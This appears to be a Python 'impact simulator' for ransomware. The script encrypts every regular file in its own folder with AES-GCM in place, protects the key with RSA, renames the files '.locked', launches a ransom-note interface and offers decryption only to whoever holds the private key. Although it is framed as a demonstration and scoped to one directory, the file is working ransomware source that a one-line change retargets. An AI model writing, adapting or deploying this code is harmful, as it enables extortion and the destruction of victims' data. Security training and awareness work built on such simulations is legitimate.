import os
import sys
from pathlib import Path
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes, serialization

# ---------- Config ----------
KEY_FILE     = "key.bin"
TARGET_EXT   = ".locked"
RSA_PUB_FILE = "rsa_public.pem"

BASE_DIR    = Path(__file__).resolve().parent
SCRIPT_PATH = Path(__file__).resolve()
KEY_PATH    = BASE_DIR / KEY_FILE
PUB_PATH    = BASE_DIR / RSA_PUB_FILE
NOTE_PATH   = BASE_DIR / "impact_simulator_gui.py"
# ----------------------------

# UI is imported lazily so a missing GUI file doesn't break CLI decrypt
try:
    from gui import run_ransom_note
    _HAS_UI = True
except ImportError:
    _HAS_UI = False


# ---------- Crypto helpers ----------
def load_public_key():
    with open(PUB_PATH, "rb") as f:
        return serialization.load_pem_public_key(f.read())


def encrypt_aes_key(aes_key: bytes, pub_key) -> bytes:
    return pub_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )


def decrypt_aes_key(enc_key: bytes, priv_key) -> bytes:
    return priv_key.decrypt(
        enc_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )


def encrypt_file(file: Path, aes):
    data = file.read_bytes()
    nonce = os.urandom(12)
    ciphertext = aes.encrypt(nonce, data, None)
    file.write_bytes(nonce + ciphertext)   # overwrite in place


def decrypt_file(file: Path, aes):
    blob = file.read_bytes()
    nonce, ciphertext = blob[:12], blob[12:]
    data = aes.decrypt(nonce, ciphertext, None)
    file.write_bytes(data)                 # overwrite in place


# ---------- File listing ----------
def _skip(full: Path) -> bool:
    return (
        full == SCRIPT_PATH
        or full == KEY_PATH
        or full == NOTE_PATH
        or full.name == RSA_PUB_FILE
    )


def _list_plain_files():
    for name in os.listdir(BASE_DIR):
        full = BASE_DIR / name
        if _skip(full):
            continue
        if full.is_symlink() or not full.is_file():
            continue
        if name.endswith(TARGET_EXT):
            continue
        yield full


def _list_locked_files():
    for name in os.listdir(BASE_DIR):
        if not name.endswith(TARGET_EXT):
            continue
        full = BASE_DIR / name
        if _skip(full):
            continue
        if full.is_symlink() or not full.is_file():
            continue
        yield full


def count_locked() -> int:
    return sum(1 for _ in _list_locked_files())


# ---------- Encrypt / decrypt ----------
def encrypt_all():
    if not PUB_PATH.exists():
        print(f"[!] Missing public key: {RSA_PUB_FILE} must be in {BASE_DIR}")
        return

    aes_key = AESGCM.generate_key(bit_length=256)
    enc_key = encrypt_aes_key(aes_key, load_public_key())
    KEY_PATH.write_bytes(enc_key)
    print(f"[+] AES key encrypted with RSA public key -> {KEY_FILE}")

    aes = AESGCM(aes_key)

    for file in _list_plain_files():
        try:
            encrypt_file(file, aes)
            file.rename(file.with_name(file.name + TARGET_EXT))
            print(f"[+] Encrypted: {file.name}")
        except Exception as e:
            print(f"[!] Failed {file.name}: {e}")


def decrypt_all_with_pem(priv_pem: bytes):
    """Used by the impact simulator UI. Returns (success, message)."""
    if not KEY_PATH.exists():
        return False, "No encrypted key file found."
    try:
        priv_key = serialization.load_pem_private_key(priv_pem, password=None)
    except Exception as e:
        return False, f"Invalid private key: {e}"
    try:
        aes_key = decrypt_aes_key(KEY_PATH.read_bytes(), priv_key)
    except Exception as e:
        return False, f"Failed to decrypt AES key: {e}"

    aes = AESGCM(aes_key)
    count = 0
    for locked in _list_locked_files():
        original = locked.with_name(locked.name[: -len(TARGET_EXT)])
        try:
            decrypt_file(locked, aes)
            locked.rename(original)
            count += 1
        except Exception as e:
            return False, f"Failed on {locked.name}: {e}"
    return True, f"Decrypted {count} file(s)."


def decrypt_all():
    """CLI decrypt — prompts for PEM in plain text."""
    if not KEY_PATH.exists():
        print("[!] No encrypted key file found.")
        return
    print("[?] Paste the RSA private key PEM, then an empty line:")
    lines = []
    while True:
        line = input()
        if line == "":
            break
        lines.append(line)
    ok, msg = decrypt_all_with_pem("\n".join(lines).encode())
    print(f"[+] {msg}" if ok else f"[!] {msg}")


# ---------- Entry point ----------
if __name__ == "__main__":
    print("1. Encrypt test files (then show impact interface)")
    print("2. Decrypt encrypted copies (CLI)")
    choice = input("Choose 1 or 2: ").strip()

    if choice == "1":
        encrypt_all()
        n = count_locked()
        if n == 0:
            print("[!] Nothing was encrypted — check rsa_public.pem exists.")
        elif not _HAS_UI:
            print("[!] impact_simulator_gui.py not found — skipping UI.")
        else:
            run_ransom_note(n, decrypt_all_with_pem)
            print("[*] Interface closed. Files are still encrypted.")
            print("    Re-run and press D inside the interface, or choose 2 to decrypt.")
    elif choice == "2":
        decrypt_all()
    else:
        print("Invalid choice")